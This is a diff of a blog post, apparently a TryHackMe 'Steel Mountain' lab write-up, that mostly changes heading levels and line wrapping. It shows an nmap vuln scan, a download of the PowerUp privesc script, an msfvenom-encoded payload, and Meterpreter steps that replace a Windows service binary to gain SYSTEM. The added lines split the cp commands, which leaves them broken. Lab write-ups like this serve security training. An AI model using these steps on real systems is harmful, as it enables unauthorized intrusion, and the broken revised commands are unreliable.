@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-11-07 05:00:00.000000000 Z
+date: 2021-11-07 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-11-07-tryhackme-complete-beginner.html
 author: 100007
@@ -9,11 +9,11 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-11-07</p>
-<h2 id="steel-mountain">Steel Mountain</h2>
-<h3 id="introduction">Introduction</h3>
+<h1 id="steel-mountain">Steel Mountain</h1>
+<h2 id="introduction">Introduction</h2>
 <p>Apparently this machine is running a web server. (Though I never would have guest that without first searching for a walkthrough of this TryHackMe room, as my initial response was, “how the hell do I know who the employee of the month is based on the IP of a Windows machine I can’t yet log into?”)</p>
 <p>The machine IP address for this exercise is 10.10.241.108.</p>
-<h3 id="initial-access">Initial Access</h3>
+<h2 id="initial-access">Initial Access</h2>
 <p>NMAP command line (note that we skip the ping test, since Windows machines don’t respond to ping by default, and because the introduction told us that this machine wouldn’t respond to ping):</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-oA</span> steel-mountain <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-sS</span> <span class="se">\</span>
 <span class="nt">--script</span> vuln <span class="nt">-p-</span> 10.10.241.108
@@ -168,7 +168,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <ul>
 <li><a href="https://cardboard-iguana.com/notes/nmap.html">Using “nmap”</a></li>
 </ul>
-<h3 id="privilege-escalation">Privilege Escalation</h3>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>PowerUp is a script that scans for common Windows vulnerabilities. It looks like the version that’s included with Kali Linux is different and/or not-up-to-date relative to the version of PowerUp linked to by the TryHackMe Steelmountain room. In particular, Kali version doesn’t list <em>a lot</em> of information about potentially vulnerable services that is necessary for completing this section. (On the downside, the version of PowerUp we need to use produces <em>a lot</em> of duplicative output too…)</p>
 <p>Anyways, first we have to download the more capable version of PowerUp:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-O</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
@@ -190,14 +190,16 @@ powershell_shell
 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-o</span> ASCService.exe
 </code></pre></div></div>
 <p>(The reason we need to specify an encoder here is because the vulnerable binary is in Program Files (x86), so we need to produce an x86 binary rather than the default x86_64 binary.)</p>
-<p>To upload this, we’ll need to background PowerShell with <code class="language-plaintext highlighter-rouge">^Z</code>. (<em>Don’t</em> try to exit — for me this caused hangs, and I eventually had to restart the machine!) Upload and then start a new shell:</p>
+<p>To upload this, we’ll need to background PowerShell with <code class="language-plaintext highlighter-rouge">^Z</code>. (<em>Don’t</em> try to exit - for me this caused hangs, and I eventually had to restart the machine!) Upload and then start a new shell:</p>
 <pre><code class="language-meterpreter">upload /home/kali/ASCService.exe
 powershell_shell
 </code></pre>
 <p>Replace the ASCService.exe binary (its permissions are such that we can do this) and restart the service:</p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Stop-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
-</span><span class="n">cp</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w"> </span><span class="nx">ASCService.exe.bak</span><span class="w">
-</span><span class="n">cp</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="nx">ASCService.exe</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
+</span><span class="n">cp</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
+</span><span class="n">ASCService.exe.bak</span><span class="w">
+</span><span class="nx">cp</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="nx">ASCService.exe</span><span class="w">
+</span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
 </span><span class="n">Start-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
 </span></code></pre></div></div>
 <p>(We can run Stop-Service and Start-Service because the user we’ve compromised has the CanRestart permission for this service.)</p>
@@ -206,7 +208,8 @@ powershell_shell
 </code></pre></div></div>
 <p>Once we have the root flag, let’s put the service back the way it was before we try the non-Metasploit version of this.</p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Stop-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
-</span><span class="n">cp</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="nx">ASCService.exe.bak</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
+</span><span class="n">cp</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="nx">ASCService.exe.bak</span><span class="w">
+</span><span class="s2">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span class="w">
 </span><span class="n">Start-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
 </span></code></pre></div></div>
 <ul>
